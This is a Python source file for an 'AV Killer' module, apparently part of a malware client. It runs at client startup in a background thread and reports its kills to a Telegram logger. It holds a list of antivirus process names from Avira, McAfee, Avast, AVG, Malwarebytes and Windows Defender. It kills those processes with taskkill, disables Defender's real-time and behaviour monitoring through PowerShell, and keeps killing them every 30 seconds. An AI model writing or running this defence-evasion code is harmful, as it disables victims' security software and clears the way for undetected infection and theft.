"""
AV Killer - Automatically kills antivirus processes
Runs in background thread on client startup
"""

import subprocess
import time
import threading
import os

# List of AV processes to kill
AV_PROCESSES = [
    # Avira
    'avguard.exe',
    'avgnt.exe',
    'avira.servicehost.exe',
    # McAfee
    'McShield.exe',
    'mfemms.exe',
    'mfevtps.exe',
    'mcafee.exe',
    # Avast
    'AvastUI.exe',
    'AvastSvc.exe',
    'aswidsagent.exe',
    # AVG
    'AVGUI.exe',
    'AVGSvc.exe',
    'avgidsagent.exe',
    # Malwarebytes
    'MBAMService.exe',
    'MBAMTray.exe',
    'mbam.exe',
    # Windows Defender (optional)
    'MsMpEng.exe',
    'MpCmdRun.exe',
]


class AVKiller:
    """Monitors and kills AV processes in background"""

    def __init__(self, tel_logger_func=None):
        self.tel_logger = tel_logger_func
        self.running = False
        self.thread = None
        self.killed_processes = set()  # Track what we've killed

    def log(self, message):
        """Send log to Telegram"""
        print(message)
        if self.tel_logger:
            self.tel_logger(message)

    def kill_process(self, process_name):
        """Kill a specific process"""
        try:
            # Try taskkill with force
            cmd = f'taskkill /F /IM "{process_name}" /T'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                return True
            else:
                # Process might not be running
                return False
        except Exception as e:
            print(f"[!] Failed to kill {process_name}: {e}")
            return False

    def disable_windows_defender(self):
        """Disable Windows Defender (if admin)"""
        try:
            # Disable real-time monitoring
            cmd = 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true"'
            subprocess.run(cmd, shell=True, capture_output=True)

            # Kill Defender processes
            subprocess.run('taskkill /F /IM MsMpEng.exe', shell=True, capture_output=True)
            subprocess.run('taskkill /F /IM MpCmdRun.exe', shell=True, capture_output=True)

            return True
        except:
            return False

    def scan_and_kill(self):
        """Scan for AV processes and kill them"""
        killed_this_scan = []

        for process in AV_PROCESSES:
            # Check if process is running
            check_cmd = f'tasklist /FI "IMAGENAME eq {process}" 2>NUL | find /I /N "{process}">NUL'
            result = subprocess.run(check_cmd, shell=True)

            if result.returncode == 0:
                # Process is running
                if self.kill_process(process):
                    killed_this_scan.append(process)

                    # Only log if we haven't killed this before
                    if process not in self.killed_processes:
                        self.log(f"[AV KILLER] Killed: {process}")
                        self.killed_processes.add(process)

        return killed_this_scan

    def monitor_loop(self):
        """Main monitoring loop (runs in background thread)"""
        self.log("[AV KILLER] Starting background AV monitor...")

        # Initial scan - kill everything immediately
        initial_kills = self.scan_and_kill()

        if initial_kills:
            self.log(f"[AV KILLER] Initial scan killed {len(initial_kills)} processes: {', '.join(initial_kills)}")
        else:
            self.log("[AV KILLER] Initial scan - no AV processes found")

        # Try to disable Windows Defender
        if self.disable_windows_defender():
            self.log("[AV KILLER] Windows Defender disabled")

        # Continue monitoring every 30 seconds
        while self.running:
            try:
                time.sleep(30)  # Check every 30 seconds

                killed = self.scan_and_kill()

                # Only log if we killed something NEW
                if killed:
                    new_kills = [p for p in killed if p not in self.killed_processes]
                    if new_kills:
                        self.log(f"[AV KILLER] Detected and killed: {', '.join(new_kills)}")

            except Exception as e:
                self.log(f"[AV KILLER] Error in monitor loop: {e}")
                time.sleep(60)  # Wait longer on error

    def start(self):
        """Start the AV killer in background thread"""
        if self.running:
            return  # Already running

        self.running = True
        self.thread = threading.Thread(target=self.monitor_loop, daemon=True)
        self.thread.start()

        self.log("[AV KILLER] Background monitor started")

    def stop(self):
        """Stop the AV killer"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        self.log("[AV KILLER] Monitor stopped")


# Quick test function
if __name__ == "__main__":
    killer = AVKiller()
    killer.start()

    # Keep running for 2 minutes for testing
    print("Running for 2 minutes... Press Ctrl+C to stop")
    try:
        time.sleep(120)
    except KeyboardInterrupt:
        pass

    killer.stop()